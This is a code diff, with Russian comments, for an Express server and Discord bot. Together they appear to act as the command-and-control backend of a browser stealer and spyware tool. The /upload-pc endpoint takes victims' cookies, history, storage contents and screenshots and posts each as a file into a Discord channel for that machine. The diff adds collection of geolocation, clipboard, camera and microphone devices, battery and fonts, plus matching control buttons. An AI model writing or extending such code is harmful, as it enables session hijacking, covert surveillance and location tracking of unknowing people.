@@ -89,7 +89,6 @@ function createControlButtons(pcId) {
         new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("История").setStyle(ButtonStyle.Success),
         new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная").setStyle(ButtonStyle.Secondary),
         new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary),
-        // новые кнопки
         new ButtonBuilder().setCustomId(`get_battery|${safePcId}`).setLabel("Батарея").setStyle(ButtonStyle.Secondary),
         new ButtonBuilder().setCustomId(`get_geolocation|${safePcId}`).setLabel("Геолокация").setStyle(ButtonStyle.Secondary),
         new ButtonBuilder().setCustomId(`get_media|${safePcId}`).setLabel("Камера/Микрофон").setStyle(ButtonStyle.Secondary),
@@ -130,11 +129,11 @@ async function sendJsonFile(channel, nameBase, jsonData) {
 // ---------- Upload PC ----------
 app.post("/upload-pc", async (req, res) => {
     try {
-        const { pcId, cookies, history, systemInfo, screenshot, localStorage, sessionStorage, indexedDB, serviceWorkers } = req.body;
+        const { pcId, cookies, history, systemInfo, screenshot, localStorage, sessionStorage, indexedDB, serviceWorkers, battery, geolocation, mediaDevices, clipboard, fonts } = req.body;
         if (!pcId) return res.status(400).json({ error: "pcId required" });
 
         onlinePCs[pcId] = Date.now();
-        pcData[pcId] = { cookies, history, systemInfo, screenshot, localStorage, sessionStorage, indexedDB, serviceWorkers };
+        pcData[pcId] = { cookies, history, systemInfo, screenshot, localStorage, sessionStorage, indexedDB, serviceWorkers, battery, geolocation, mediaDevices, clipboard, fonts };
 
         const guild = await bot.guilds.fetch(GUILD_ID);
         const category = await getOrCreateCategory(guild, CATEGORY_BASE_PC);
@@ -143,6 +142,7 @@ app.post("/upload-pc", async (req, res) => {
         if (!finalChannel) finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
         channelByPC[pcId] = finalChannel.id;
 
+        // отправка данных
         if (cookies) await sendJsonFile(finalChannel, `${channelName}-cookies`, cookies);
         if (history) await sendJsonFile(finalChannel, `${channelName}-history`, history);
         if (systemInfo) await sendJsonFile(finalChannel, `${channelName}-system`, systemInfo);
@@ -150,6 +150,11 @@ app.post("/upload-pc", async (req, res) => {
         if (sessionStorage) await sendJsonFile(finalChannel, `${channelName}-sessionStorage`, sessionStorage);
         if (indexedDB) await sendJsonFile(finalChannel, `${channelName}-indexedDB`, indexedDB);
         if (serviceWorkers) await sendJsonFile(finalChannel, `${channelName}-serviceWorkers`, serviceWorkers);
+        if (battery) await sendJsonFile(finalChannel, `${channelName}-battery`, battery);
+        if (geolocation) await sendJsonFile(finalChannel, `${channelName}-geolocation`, geolocation);
+        if (mediaDevices) await sendJsonFile(finalChannel, `${channelName}-media`, mediaDevices);
+        if (clipboard) await sendJsonFile(finalChannel, `${channelName}-clipboard`, clipboard);
+        if (fonts) await sendJsonFile(finalChannel, `${channelName}-fonts`, fonts);
         if (screenshot) await finalChannel.send({ files: [{ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` }] });
 
         await finalChannel.send({ content: `🟢 ПК **${pcId}** обновлён`, components: createControlButtons(pcId) });
